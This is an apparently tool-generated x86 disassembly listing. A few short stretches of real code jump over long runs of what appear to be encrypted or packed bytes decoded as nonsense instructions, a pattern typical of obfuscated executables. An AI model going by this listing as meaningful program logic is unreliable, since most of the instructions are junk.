  4073b1:	mov    eax,DWORD PTR [ebp+0xc]
  4073b4:	xor    ecx,esi
  4073b6:	add    ecx,edi
  4073b8:	xor    edx,edx
  4073ba:	div    ecx
  4073bc:	mov    ecx,DWORD PTR [ebp-0x8]
  4073bf:	cmp    ecx,eax
  4073c1:	jne    0x4073cc
  4073c7:	call   0x401000
  4073cc:	lea    eax,[ebp+0x4]
  4073cf:	mov    DWORD PTR [ebp-0x24],eax
  4073d2:	mov    eax,ds:0x413bde
  4073d7:	push   0x4
  4073d9:	add    eax,0x1cc
  4073de:	push   eax
  4073df:	lea    eax,[ebp-0xc]
  4073e2:	push   eax
  4073e3:	call   0x410353
  4073e8:	mov    eax,DWORD PTR [ebp-0xc]
  4073eb:	mov    eax,DWORD PTR [ebp-0x4]
  4073ee:	mov    eax,DWORD PTR [ebp-0x8]
  4073f1:	mov    DWORD PTR [ebp+0xc],eax
  4073f4:	mov    eax,ds:0x413c62
  4073f9:	mov    ecx,DWORD PTR [ebp+0xc]
  4073fc:	sub    eax,edi
  4073fe:	xor    eax,esi
  407400:	cmp    eax,ecx
  407402:	je     0x407449
  407408:	mov    eax,ds:0x413c5a
  40740d:	mov    ecx,DWORD PTR [ebp+0xc]
  407410:	sub    eax,edi
  407412:	xor    eax,esi
  407414:	cmp    eax,ecx
  407416:	jne    0x40742c
  40741c:	mov    eax,ds:0x413c62
  407421:	add    eax,DWORD PTR ds:0x413c5a
  407427:	jmp    0x407433
  40742c:	mov    eax,DWORD PTR [ebp+0xc]
  40742f:	xor    eax,esi
  407431:	add    eax,edi
  407433:	mov    ds:0x413c5a,eax
  407438:	mov    eax,DWORD PTR [ebp+0xc]
  40743b:	xor    eax,esi
  40743d:	add    eax,edi
  40743f:	mov    ds:0x413c62,eax
  407444:	jmp    0x407453
  407449:	mov    eax,ds:0x413c62
  40744e:	mov    ds:0x413c5a,eax
  407453:	mov    eax,DWORD PTR [ebp-0x24]
  407456:	mov    ecx,DWORD PTR ds:0x413c5a
  40745c:	add    DWORD PTR [eax],ecx
  40745e:	mov    eax,DWORD PTR [ebp-0xc]
  407461:	mov    eax,DWORD PTR [eax]
  407463:	pop    edi
  407464:	pop    esi
  407465:	pop    ebx
  407466:	leave  
  407467:	ret    0xc
  40746a:	push   ebp
  40746b:	mov    ebp,esp
  40746d:	push   ecx
  40746e:	push   ecx
  40746f:	mov    DWORD PTR ds:0x43366f,edi
  407475:	mov    eax,0x5a3fc98
  40747a:	movzx  ecx,WORD PTR ds:0x43362f
  407481:	mov    DWORD PTR [ebp-0x4],eax
  407484:	jmp    0x4077cf
  407489:	shl    DWORD PTR [edi],0x5f
  40748c:	sbb    DWORD PTR [ecx+0x61],ebx
  40748f:	inc    ecx
  407490:	out    0xc2,eax
  407492:	jle    0x40743d
  407494:	inc    ebx
  407495:	popa   
  407496:	dec    edx
  407497:	xor    eax,0x7ec0a434
  40749c:	jle    0x4074be
  40749e:	jge    0x40751e
  4074a0:	jle    0x40750b
  4074a2:	lea    ebx,[edx+0x5]
  4074a5:	inc    esi
  4074a6:	out    0x69,eax
  4074a8:	xchg   ecx,eax
  4074a9:	dec    eax
  4074aa:	jge    0x407493
  4074ac:	mov    bl,0xa9
  4074ae:	xchg   dh,dl
  4074b0:	nop
  4074b1:	clc    
  4074b2:	out    0xbd,eax
  4074b4:	retf   
  4074b5:	rcr    BYTE PTR [edi],cl
  4074b7:	std    
  4074b8:	inc    edi
  4074b9:	call   0xc69f:0x50270ba2
  4074c0:	mov    eax,0x9abd3a7b
  4074c5:	or     al,0x99
  4074c7:	scas   al,BYTE PTR es:[edi]
  4074c8:	sub    dh,BYTE PTR [edi+0x48]
  4074cb:	test   DWORD PTR [edx-0x6a],0x606bd7bc
  4074d2:	fsub   QWORD PTR [esi+0x32]
  4074d5:	div    cl
  4074d7:	and    eax,0xcdf86487
  4074dc:	xor    eax,DWORD PTR [esi]
  4074de:	cmp    cl,cl
  4074e0:	cld    
  4074e1:	shl    DWORD PTR [ecx+ecx*1+0x56],1
  4074e5:	mov    ecx,0xfca5b90a
  4074ea:	fdivr  DWORD PTR ds:0x4f66eb09
  4074f0:	daa    
  4074f1:	add    al,0xb0
  4074f3:	fild   DWORD PTR [edx-0x610e90a]
  4074f9:	cmp    dl,ch
  4074fb:	shr    BYTE PTR [esi],1
  4074fd:	aam    0x9e
  4074ff:	and    eax,0x6ebfe546
  407504:	in     al,dx
  407505:	xor    ebx,DWORD PTR [esp+eiz*2+0x30]
  407509:	or     bh,BYTE PTR ds:0x5ae40f8f
  40750f:	mov    cl,0x6c
  407511:	xor    bh,BYTE PTR [edx-0x7c]
  407514:	int3   
  407515:	mov    ds:0xfcdb48d6,eax
  40751a:	inc    DWORD PTR [eax+0x58673703]
  407520:	and    al,0x37
  407522:	pop    edi
  407523:	rol    BYTE PTR [eax-0x2],cl
  407526:	repnz sti 
  407528:	push   esi
  407529:	stos   DWORD PTR es:[edi],eax
  40752a:	hlt    
  40752b:	shl    BYTE PTR ds:[edi+0x34],1
  40752f:	jecxz  0x4074fe
  407531:	mov    ?,esp
  407533:	push   ebx
  407534:	sbb    edi,DWORD PTR [ecx]
  407536:	pcmpeqd mm2,mm6
  407539:	repnz dec edi
  40753b:	ss into 
  40753d:	mov    edx,DWORD PTR ds:0xddc3e881
  407543:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407544:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407545:	leave  
  407546:	mov    bh,BYTE PTR [ebx-0x348350ce]
  40754c:	push   ebp
  40754d:	add    eax,0x27e29220
  407552:	mov    edi,0xe292492f
  407557:	test   BYTE PTR [eax+0x2094ce75],0x1f
  40755e:	or     BYTE PTR [edx-0x22],dl
  407561:	stos   DWORD PTR es:[edi],eax
  407562:	inc    ebx
  407563:	mov    esi,0x1b03afa3
  407568:	pop    ss
  407569:	dec    esp
  40756a:	aad    0x63
  40756c:	ss adc al,0x31
  40756f:	sub    eax,0x4f1d3aef
  407574:	push   ebx
  407575:	(bad)  
  407576:	mov    ebx,0xb04fafca
  40757b:	pop    esi
  40757c:	(bad)  
  40757d:	push   edx
  40757e:	loop   0x4075f3
  407580:	sbb    ebp,ecx
  407582:	jecxz  0x4075fd
  407584:	xor    ch,dl
  407586:	push   es
  407587:	sub    DWORD PTR [esi-0x2e],eax
  40758a:	push   edi
  40758b:	sbb    DWORD PTR [esp+esi*8],edi
  40758e:	(bad)  
  40758f:	jnp    0x407531
  407591:	data16 std 
  407593:	sub    eax,0xd0862c8c
  407598:	cmp    al,0xf7
  40759a:	sub    bh,BYTE PTR ds:0xb1b21a84
  4075a0:	in     al,dx
  4075a1:	jbe    0x407621
  4075a3:	xchg   ebp,eax
  4075a4:	gs loopne 0x407619
  4075a7:	sti    
  4075a8:	xchg   esp,eax
  4075a9:	jo     0x4075d2
  4075ab:	addr16 pop ebp
  4075ad:	popa   
  4075ae:	or     ecx,ecx
  4075b0:	pop    ecx
  4075b1:	lods   eax,DWORD PTR ds:[esi]
  4075b2:	push   ecx
  4075b3:	cld    
  4075b4:	(bad)  
  4075b5:	push   ecx
  4075b6:	mov    edx,0x80d485ba
  4075bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075bc:	inc    esi
  4075bd:	pop    esp
  4075be:	or     ebx,DWORD PTR [edx]
  4075c0:	inc    ecx
  4075c1:	xchg   dh,ah
  4075c3:	or     cl,BYTE PTR cs:[esi+0x1344408]
  4075ca:	dec    esi
  4075cb:	dec    edi
  4075cc:	jl     0x40757c
  4075ce:	and    eax,0xd3808cbf
  4075d3:	and    ebp,DWORD PTR [esi]
  4075d5:	add    al,dl
  4075d7:	aas    
  4075d8:	jns    0x4075b4
  4075da:	or     cl,ah
  4075dc:	jg     0x407659
  4075de:	jmp    0xcba939b9
  4075e3:	cmp    al,0xbb
  4075e5:	mov    ebx,0x9f00b6f0
  4075ea:	mov    dh,0x28
  4075ec:	(bad)  
  4075ee:	leave  
  4075ef:	mov    BYTE PTR [edi+0x4aa0c62],0x4b
  4075f6:	into   
  4075f7:	xor    ebp,DWORD PTR [edi]
  4075f9:	ficomp DWORD PTR [ebp-0x5ded722e]
  4075ff:	sub    al,0xf0
  407601:	lods   al,BYTE PTR ds:[esi]
  407602:	nop
  407603:	sbb    BYTE PTR [edx+0x1fdc61b8],al
  407609:	jno    0x40765f
  40760b:	cmp    eax,0x408f2db9
  407610:	sub    eax,0x1c98e096
  407615:	stos   BYTE PTR es:[edi],al
  407616:	sbb    ch,al
  407618:	jbe    0x407690
  40761a:	inc    esp
  40761b:	shr    DWORD PTR [eax+0x4142a7ac],0x87
  407622:	stos   DWORD PTR es:[edi],eax
  407623:	mov    esp,0xa729484a
  407628:	cmp    BYTE PTR [eax],cl
  40762a:	push   esp
  40762b:	mov    ?,ecx
  40762d:	dec    esi
  40762e:	mov    dl,0xfd
  407630:	inc    ebp
  407631:	test   bh,ah
  407633:	add    bh,bh
  407635:	push   esi
  407636:	mov    bl,0x65
  407638:	sbb    al,0xf3
  40763a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40763b:	or     al,0x69
  40763d:	adc    BYTE PTR [eax+0x283a547a],0x9a
  407644:	pop    edi
  407645:	in     al,0x64
  407647:	mov    bl,0x5a
  407649:	push   ds
  40764a:	push   ds
  40764b:	ficom  WORD PTR [eax-0x11]
  40764e:	outs   dx,BYTE PTR ds:[esi]
  40764f:	sub    esp,eax
  407651:	adc    DWORD PTR [esi],eax
  407653:	iret   
  407654:	jne    0x407646
  407656:	ret    0x4016
  407659:	pop    ecx
  40765a:	ret    0xe2ac
  40765d:	adc    BYTE PTR [ecx],bl
  40765f:	in     eax,0x3c
  407661:	(bad)  
  407662:	rcl    BYTE PTR [eax+0x27dfd134],0x84
  407669:	loopne 0x407642
  40766b:	mul    ebx
  40766d:	and    DWORD PTR [ebx],esi
  40766f:	aas    
  407670:	cwde   
  407671:	sahf   
  407672:	add    esp,DWORD PTR [eax-0x79]
  407675:	push   ebp
  407676:	adc    bl,BYTE PTR [edi]
  407678:	out    0x35,al
  40767a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40767b:	aaa    
  40767c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40767d:	xor    BYTE PTR [edi+edx*8+0x4c],0xb0
  407682:	mov    edi,0xc35a83dc
  407687:	xchg   BYTE PTR [edx+esi*4+0x45],dl
  40768b:	jns    0x40768f
  40768d:	es dec ebx
  40768f:	mov    edi,0x626eaedd
  407694:	xchg   DWORD PTR [edi+0x108467e3],edx
  40769a:	jle    0x407624
  40769c:	neg    esi
  40769e:	mov    dh,0xd
  4076a0:	xlat   BYTE PTR ds:[ebx]
  4076a1:	jp     0x407687
  4076a3:	lahf   
  4076a4:	addr16 in eax,0x30
  4076a7:	pushf  
  4076a8:	pop    edi
  4076a9:	mov    al,0x20
  4076ab:	pop    ss
  4076ac:	fsubr  DWORD PTR [eax+0x1]
  4076af:	fwait
  4076b0:	sbb    esi,DWORD PTR [ebx-0x797a594]
  4076b6:	es xor al,0x4d
  4076b9:	leave  
  4076ba:	sbb    eax,0x813e0846
  4076bf:	jnp    0x4076ae
  4076c1:	push   ds
  4076c2:	ss out dx,eax
  4076c4:	cmp    BYTE PTR [ecx+ebx*1],0x9b
  4076c8:	dec    esp
  4076c9:	dec    edi
  4076ca:	adc    BYTE PTR [edi],dl
  4076cc:	cmp    ah,BYTE PTR [eax+0x55]
  4076cf:	fs jno 0x407750
  4076d2:	sbb    DWORD PTR [ebx],0xffffffa4
  4076d5:	rcr    DWORD PTR ds:0x4fc86a3a,cl
  4076db:	jle    0x4076d0
  4076dd:	mov    ds:0x6a4d7c62,eax
  4076e2:	xchg   esp,eax
  4076e3:	test   esi,edi
  4076e5:	xor    eax,0xeaeebc0f
  4076ea:	mov    al,0x0
  4076ec:	jae    0x4076b8
  4076ee:	or     BYTE PTR [esi],bl
  4076f0:	sub    BYTE PTR [ebp+ecx*2-0x71],ah
  4076f4:	arpl   WORD PTR [ebx+0x22aa37ba],sp
  4076fa:	arpl   WORD PTR [ebp+0x58f59ee6],cx
  407700:	mov    eax,0x38827a93
  407705:	xchg   esp,eax
  407706:	xchg   DWORD PTR [edx-0x46],eax
  407709:	fistp  WORD PTR [ecx]
  40770b:	lea    ebp,[ecx+eax*1+0x7]
  40770f:	in     al,dx
  407710:	imul   edi,esp,0x29
  407713:	jns    0x4076fb
  407715:	(bad)  
  407717:	das    
  407718:	adc    al,0xc
  40771a:	test   BYTE PTR [ebx-0x81aa120],0x24
  407721:	stc    
  407722:	cdq    
  407723:	(bad)  
  407724:	fldz   
  407726:	xchg   esi,eax
  407727:	push   esi
  407728:	mov    cl,0x96
  40772a:	jnp    0x40773b
  40772c:	xor    BYTE PTR [esi*2+0x4f3ca170],dl
  407733:	xor    eax,0x30086829
  407738:	aas    
  407739:	stc    
  40773a:	adc    BYTE PTR [ebp+0x25],ah
  40773d:	xchg   esp,eax
  40773e:	fadd   st(4),st
  407740:	jmp    0x9af4de22
  407745:	dec    ecx
  407746:	inc    eax
  407747:	fldcw  WORD PTR [edx-0xd]
  40774a:	bound  edi,QWORD PTR [ecx-0x7a]
  40774d:	pushf  
  40774e:	cmp    eax,0x37532d26
  407753:	jge    0x4076d6
  407755:	xchg   ebx,eax
  407756:	pop    ds
  407757:	div    BYTE PTR [eax+0x59]
  40775a:	and    DWORD PTR [ebx+0x2cbc4432],edx
  407760:	cmp    ebp,DWORD PTR [ebp-0x1c85aa59]
  407766:	(bad)  
  407767:	mov    ecx,0x172fdd59
  40776c:	clc    
  40776d:	sub    cl,dl
  40776f:	push   es
  407770:	and    dl,BYTE PTR [ebx]
  407772:	and    al,0xed
  407774:	shr    BYTE PTR [ebx],0x21
  407777:	shr    DWORD PTR [ecx-0xe],1
  40777a:	cmc    
  40777b:	repnz test eax,0x42730a6e
  407781:	in     eax,0x8d
  407783:	mov    WORD PTR [ebx+0x7599588d],fs
  407789:	push   esi
  40778a:	out    dx,al
  40778b:	jmp    0xd46825b5
  407790:	push   ds
  407791:	jno    0x40775a
  407793:	mov    ebx,0x7fd1919c
  407798:	imul   edi,DWORD PTR [eax+0x5d67dddb],0x1c
  40779f:	or     eax,0xf9ae9e1c
  4077a4:	fidivr DWORD PTR [edi-0x4c]
  4077a7:	shr    dh,1
  4077a9:	sar    BYTE PTR [ecx-0x12c3dca6],0x3f
  4077b0:	sub    ah,BYTE PTR [edx+0x5]
  4077b3:	retf   
  4077b4:	sti    
  4077b5:	add    ebp,eax
  4077b7:	jp     0x4077b5
  4077b9:	(bad)  
  4077ba:	or     edx,DWORD PTR [ecx+0x6f]
  4077bd:	pop    ss
  4077be:	or     ebx,DWORD PTR ds:0x4e5eee3a
  4077c4:	dec    esp
  4077c5:	or     dl,cl
  4077c7:	ins    BYTE PTR es:[edi],dx
  4077c8:	mov    ebx,0x47890c10
  4077cd:	imul   edx,DWORD PTR [eax],0xc7fc4d8b
  4077d3:	add    eax,0x4336a7
  4077d8:	gs pop esi
  4077da:	add    BYTE PTR [eax],al
  4077dc:	mov    DWORD PTR [ebp-0x8],0x4ec1
  4077e3:	jmp    0x407b2e
  4077e8:	out    dx,eax
  4077e9:	psubd  mm2,QWORD PTR [ecx+0x5a]
  4077ed:	push   ecx
  4077ee:	cmc    
  4077ef:	mov    cl,0x14
  4077f1:	loop   0x40786d
  4077f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077f4:	sub    esp,DWORD PTR [eax-0x28]
  4077f7:	out    0x56,al
  4077f9:	iret   
  4077fa:	jle    0x40787a
  4077fc:	and    BYTE PTR [ebp+0x7e],bh
  4077ff:	jle    0x40778f
  407801:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407802:	mov    ds:0x24ec594b,eax
  407807:	int3   
  407808:	jg     0x40778a
  40780a:	out    0xbb,al
  40780c:	pop    es
  40780d:	sub    ebp,esi
  40780f:	sbb    esp,DWORD PTR [eax]
  407811:	cmc    
  407812:	cs ror dh,cl
  407815:	int    0x6f
  407817:	inc    edx
  407818:	mov    esi,0xedb61c93
  40781d:	clc    
  40781e:	sub    BYTE PTR ds:0x6ecd2d8,bh
  407824:	mov    esi,DWORD PTR [eax+0x6d9841d9]
  40782a:	pop    ds
  40782b:	dec    esp
  40782c:	pusha  
  40782d:	fimul  DWORD PTR [esi-0x1f]
  407830:	mov    dh,0xfd
  407832:	inc    esp
  407833:	fisttp QWORD PTR [edx+0x70]
  407836:	inc    ebx
  407837:	push   ebp
  407838:	pushf  
  407839:	cmp    esi,DWORD PTR [esi-0x5f6230d8]
  40783f:	and    eax,0x51c42e12
  407844:	xchg   DWORD PTR [eax],edx
  407846:	jb     0x40784d
  407848:	cmp    BYTE PTR [ecx-0x17a3eca8],ah
  40784e:	mov    BYTE PTR [ebx+0x4f],bl
  407851:	push   ss
  407852:	sub    BYTE PTR [esi+0x2bfbff9c],bl
  407858:	fadd   DWORD PTR [esi-0x57]
  40785b:	aas    
  40785c:	xor    DWORD PTR gs:[esi],ebx
  40785f:	and    al,0x17
  407861:	fild   DWORD PTR [edx-0x2f2eaa31]
  407868:	lods   al,BYTE PTR ds:[esi]
  407869:	int3   
  40786a:	popa   
  40786b:	mov    WORD PTR [esi+0x4062a43b],?
  407871:	mov    dh,0x10
  407873:	(bad)  [ecx+0x1778aedb]
  407879:	retf   
  40787a:	sub    edx,DWORD PTR [eax-0x2c]
  40787d:	adc    bh,BYTE PTR [edi+0xb]
  407880:	iret   
  407881:	int    0x0
  407883:	add    al,0xf2
  407885:	ds sbb eax,0xff71959b
  40788b:	pop    esi
  40788c:	mov    DWORD PTR [ebp-0x7a],esp
  40788f:	xchg   ebp,eax
  407890:	int    0x98
  407892:	fldcw  WORD PTR [ecx]
  407894:	cmp    edx,DWORD PTR [ecx]
  407896:	repz imul esi,DWORD PTR [ebx],0x8d6b8747
  40789d:	cwde   
  40789e:	jle    0x407845
  4078a0:	inc    edx
  4078a1:	pop    eax
  4078a2:	test   al,0x4d
  4078a4:	lahf   
  4078a5:	les    edx,FWORD PTR [ebx-0x44]
  4078a8:	(bad)  
  4078a9:	mov    DWORD PTR [esi-0x541a008f],esi
  4078af:	pop    eax
  4078b0:	je     0x4078a0
  4078b2:	xor    al,0x13
  4078b4:	pop    ds
  4078b5:	and    cl,BYTE PTR [edx-0x12607f95]
  4078bb:	sub    ah,BYTE PTR [ecx+0x4e]
  4078be:	(bad)  
  4078bf:	adc    ebp,DWORD PTR [edx+0x1ec0738d]
  4078c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078c6:	cmp    DWORD PTR [ecx+eax*4],edi
  4078c9:	pushf  
  4078ca:	push   0x8707ef07
  4078cf:	sbb    DWORD PTR [esi+0x75e86665],0xffffffab
  4078d6:	pop    ebp
  4078d7:	add    ebx,ecx
  4078d9:	in     eax,dx
  4078da:	inc    edi
  4078db:	jl     0x407907
  4078dd:	add    cl,BYTE PTR [eax+eiz*1]
  4078e0:	sbb    DWORD PTR [ebp+0x7e528f5],ebp
  4078e6:	shr    DWORD PTR [eax-0x79],0x8a
  4078ea:	sbb    ecx,DWORD PTR [ebp-0x47]
  4078ed:	xchg   ebp,eax
  4078ee:	cdq    
  4078ef:	push   edx
  4078f0:	jl     0x4078f0
  4078f2:	cdq    
  4078f3:	xchg   ebp,eax
  4078f4:	call   0x480c:0x4634001
  4078fb:	jne    0x407886
  4078fd:	add    BYTE PTR [eax+0x4f4d822f],0x69
  407904:	sub    dh,bl
  407906:	jl     0x4078ab
  407908:	adc    BYTE PTR [eax+0x1],al
  40790b:	adc    DWORD PTR [ebx-0x2777c147],edi
  407911:	or     eax,0x45478447
  407916:	add    al,0x85
  407918:	sub    al,0xfd
  40791a:	fidiv  WORD PTR [ecx-0x24486b54]
  407920:	jbe    0x407918
  407922:	int    0xc4
  407924:	dec    esp
  407925:	test   eax,0xa79e300
  40792a:	push   ss
  40792b:	xchg   esp,eax
  40792c:	cmp    ecx,ecx
  40792e:	retf   0x7163
  407931:	(bad)  
  407932:	stc    
  407933:	aas    
  407934:	mov    dh,BYTE PTR ds:0xc188b49e
  40793a:	arpl   WORD PTR [eax],cx
  40793c:	imul   edi,DWORD PTR [ecx],0x5208b9dc
  407942:	mov    es,WORD PTR [eax-0x350d07c4]
  407948:	dec    eax
  407949:	and    eax,0x52620b1
  40794e:	add    eax,DWORD PTR [ebx+0x2fbc48e4]
  407954:	adc    dl,ch
  407956:	cmp    BYTE PTR [ebx],ch
  407958:	cmp    al,0xb
  40795a:	cmovo  esp,edi
  40795d:	nop
  40795e:	in     al,0x1
  407960:	push   ebx
  407961:	rcr    BYTE PTR [edx+0x784f1208],0xdd
  407968:	jae    0x407962
  40796a:	ja     0x407992
  40796c:	dec    ebp
  40796d:	cmp    eax,0x17776d68
  407972:	add    dl,BYTE PTR [eax+edx*8]
  407975:	fst    QWORD PTR [ebx]
  407977:	pop    ebx
  407978:	fild   DWORD PTR [ecx]
  40797a:	pop    edx
  40797b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40797c:	imul   esp,DWORD PTR [ecx+0x18],0x18165069
  407983:	pop    ebp
  407984:	stc    
  407985:	inc    ebp
  407986:	stc    
  407987:	jl     0x4079b0
  407989:	mov    ah,0xd6
  40798b:	test   BYTE PTR [edx-0x369065c1],0x59
  407992:	xlat   BYTE PTR ds:[ebx]
  407993:	and    DWORD PTR [ecx-0x6c083d62],edi
  407999:	pushf  
  40799a:	(bad)  
  40799b:	jp     0x4079b4
  40799d:	out    0x64,eax
  40799f:	lea    ebp,[eax+eiz*4]
  4079a2:	adc    DWORD PTR [eax+0xb64aed4],eax
  4079a8:	ret    0xad84
  4079ab:	pusha  
  4079ac:	mov    esp,0x7d9c84c0
  4079b1:	mov    ch,0x90
  4079b3:	test   eax,0x89659630
  4079b8:	shr    BYTE PTR [ecx+edx*8-0x27],cl
  4079bc:	jp     0x4079d1
  4079be:	pop    ecx
  4079bf:	push   es
  4079c0:	fcmovb st,st(6)
  4079c2:	inc    edx
  4079c3:	cmp    bl,BYTE PTR [ecx-0x1d4f120d]
  4079c9:	test   eax,0x73174185
  4079ce:	xchg   BYTE PTR [edi+0x6],dh
  4079d1:	jge    0x407994
  4079d3:	ds jmp 0x407a52
  4079d6:	pusha  
  4079d7:	call   ebp
  4079d9:	out    0x19,al
  4079db:	mov    edx,0x2207eed
  4079e0:	adc    DWORD PTR [edi-0x125bebd9],0xe94c3548
  4079ea:	fmul   QWORD PTR [ebx]
  4079ec:	and    DWORD PTR [ecx+0x1b],ebx
  4079ef:	(bad)  
  4079f0:	cmp    ebp,DWORD PTR [esi+0x426077bd]
  4079f6:	repz adc eax,0xaef8a563
  4079fc:	lods   al,BYTE PTR ds:[esi]
  4079fd:	add    al,0x3d
  4079ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a00:	and    al,0xe4
  407a02:	lea    ebp,[edi+ebx*8]
  407a05:	and    bl,BYTE PTR gs:[ecx+0x1c]
  407a09:	xchg   ecx,eax
  407a0a:	or     BYTE PTR [ebp+0x18372ab],dh
  407a10:	add    al,0x5d
  407a12:	stos   DWORD PTR es:[edi],eax
  407a13:	out    0xee,al
  407a15:	pop    eax
  407a16:	mov    dh,0x2b
  407a18:	mul    bl
  407a1a:	mov    ss,WORD PTR [eax-0x68]
  407a1d:	data16 rol dh,0xb7
  407a21:	adc    esp,DWORD PTR [esi]
  407a23:	push   edx
  407a24:	cwde   
  407a25:	ss push 0x506358b4
  407a2b:	mov    bl,BYTE PTR [ebx+0x3bd3e8e6]
  407a31:	jl     0x407a31
  407a33:	call   0x14276aa4
  407a38:	inc    ebp
  407a39:	out    0x95,al
  407a3b:	or     ch,BYTE PTR [edi+0x389db143]
  407a41:	xor    eax,0x8daf04fd
  407a46:	xchg   DWORD PTR [ecx+0x375257a9],ebx
  407a4c:	fxch   st(2)
  407a4e:	aas    
  407a4f:	fisubr WORD PTR [edi-0x73b816b0]
  407a55:	shr    edx,cl
  407a57:	pusha  
  407a58:	lods   al,BYTE PTR ds:[esi]
  407a59:	cdq    
  407a5a:	pop    es
  407a5b:	out    0x21,eax
  407a5d:	adc    al,0xc8
  407a5f:	xor    eax,0x6431e404
  407a64:	jbe    0x407ada
  407a66:	mov    dl,cl
  407a68:	mov    ah,0x20
  407a6a:	push   esi
  407a6b:	and    BYTE PTR [ecx+0xa],0x4e
  407a6f:	push   esp
  407a70:	dec    edx
  407a71:	pop    eax
  407a72:	pop    esp
  407a73:	shl    BYTE PTR [edi-0x76],cl
  407a76:	dec    edi
  407a77:	bound  edx,QWORD PTR [ebx+0x28]
  407a7a:	cmc    
  407a7b:	push   ds
  407a7c:	repnz fcomp QWORD PTR [ebx]
  407a7f:	and    al,0x38
  407a81:	jge    0x407ab1
  407a83:	pop    ebp
  407a84:	std    
  407a85:	xor    ebx,DWORD PTR [esi+0x6c7dcc7e]
  407a8b:	xor    bh,BYTE PTR [ecx]
  407a8d:	or     cl,bh
  407a8f:	pop    esp
  407a90:	rol    BYTE PTR [ebp+0x3],0xb5
  407a94:	and    BYTE PTR [esp+esi*2+0x63],ch
  407a98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a99:	add    BYTE PTR [esi-0x642a3644],bh
  407a9f:	mov    dh,0x6b
  407aa1:	sahf   
  407aa2:	push   0xffffffe8
  407aa4:	shl    BYTE PTR [eax],0x83
  407aa7:	in     eax,dx
  407aa8:	or     eax,0x35b769d7
  407aad:	adc    BYTE PTR [ecx+ebp*8],bh
  407ab0:	mov    WORD PTR ds:0xa80139c7,fs
  407ab6:	popf   
  407ab7:	and    ch,BYTE PTR [ebx+0x67cad558]
  407abd:	in     eax,0xb9
  407abf:	mov    edi,0x5c2d8230
  407ac4:	or     esp,DWORD PTR [edi-0x7829bb84]
  407aca:	and    eax,0x92d89fd5
  407acf:	push   0x3fc187b3
  407ad4:	test   BYTE PTR [ebx+0x6e],0x16
  407ad8:	dec    eax
  407ad9:	and    al,0x1
  407adb:	xor    al,0xdf
  407add:	je     0x407b41
  407adf:	test   BYTE PTR [esi-0x4b8f445c],bl
  407ae5:	inc    esp
  407ae6:	enter  0x2c14,0x9e
  407aea:	and    eax,0x8ce01cc0
  407aef:	push   ss
  407af0:	pop    esp
  407af1:	inc    esp
  407af2:	in     al,0x46
  407af4:	outs   dx,DWORD PTR ds:[esi]
  407af5:	mov    edx,ecx
  407af7:	xor    eax,0x8c5b209b
  407afc:	and    BYTE PTR [eax-0x5d],bl
  407aff:	das    
  407b00:	clc    
  407b01:	inc    edi
  407b02:	cmp    eax,0xd0490979
  407b07:	pop    ebp
  407b08:	outs   dx,BYTE PTR ds:[esi]
  407b09:	(bad)  
  407b0a:	or     al,0x85
  407b0c:	hlt    
  407b0d:	sbb    BYTE PTR [edx],ah
  407b0f:	inc    edi
  407b10:	aaa    
  407b11:	and    dl,BYTE PTR [ebp+0x10e62943]
  407b17:	add    eax,0x6cd67dac
  407b1c:	add    esi,ecx
  407b1e:	sbb    al,0x5d
  407b20:	pop    es
  407b21:	fwait
  407b22:	(bad)  
  407b23:	or     esi,esp
  407b25:	mov    esp,0x2f80847a
  407b2a:	aas    
  407b2b:	cs popf 
  407b2d:	dec    edx
  407b2e:	cmp    ecx,eax
  407b30:	jne    0x407efc
  407b36:	mov    ax,WORD PTR [ebp-0x8]
  407b3a:	xor    ecx,0x551
  407b40:	mov    ecx,0x8a3c
  407b45:	sub    DWORD PTR ds:0x433623,0x433667
  407b4f:	xor    ax,cx
  407b52:	mov    ecx,0x3b02
  407b57:	sub    DWORD PTR ds:0x433703,0x1193
  407b61:	add    ax,cx
  407b64:	mov    ecx,DWORD PTR [ebp+0x8]
  407b67:	movzx  eax,ax
  407b6a:	and    DWORD PTR ds:0x43362b,0x433727
  407b74:	not    eax
  407b76:	and    eax,DWORD PTR [ecx]
  407b78:	mov    DWORD PTR ds:0x43373b,0x844
  407b82:	mov    ecx,DWORD PTR [ebp+0x8]
  407b85:	mov    DWORD PTR ds:0x4336fb,0x1c5f
  407b8f:	mov    DWORD PTR [ecx],eax
  407b91:	jmp    0x407ee8
  407b96:	jmp    0x407ee1
  407b9b:	dec    eax
  407b9c:	sbb    dh,BYTE PTR [ebx-0x16]
  407b9f:	jno    0x407c14
  407ba1:	push   ecx
  407ba2:	cwde   
  407ba3:	mov    ds:0x47f6a3a4,al
  407ba8:	in     eax,dx
  407ba9:	jg     0x407bcc
  407bab:	js     0x407b78
  407bad:	jle    0x407c2d
  407baf:	and    BYTE PTR [ebp+0x7e],bh
  407bb2:	jle    0x407bd5
  407bb4:	sbb    DWORD PTR [eax],esi
  407bb6:	(bad)  
  407bb7:	loope  0x407c32
  407bb9:	(bad)  
  407bbb:	fnstenv [edi-0x3d]
  407bbe:	or     eax,0xee1999
  407bc3:	xchg   DWORD PTR ds:0x916fd000,eax
  407bc9:	cdq    
  407bca:	scas   al,BYTE PTR es:[edi]
  407bcb:	ds leave 
  407bcd:	fld    TBYTE PTR [eax]
  407bcf:	xchg   esp,eax
  407bd0:	mov    edi,0xb035adc9
  407bd5:	push   ss
  407bd6:	clc    
  407bd7:	and    BYTE PTR gs:0x27cd5121,al
  407bde:	xor    eax,0xa59622e5
  407be3:	adc    eax,0xbc309fb5
  407be8:	dec    ecx
  407be9:	jle    0x407c5b
  407beb:	push   esi
  407bec:	fwait
  407bed:	mov    al,ds:0xe2eec08
  407bf2:	gs jae 0x407b94
  407bf5:	and    eax,0xa12a5674
  407bfa:	cld    
  407bfb:	dec    ebx
  407bfc:	(bad)  
  407bfd:	sti    
  407bfe:	push   edi
  407bff:	jo     0x407bd3
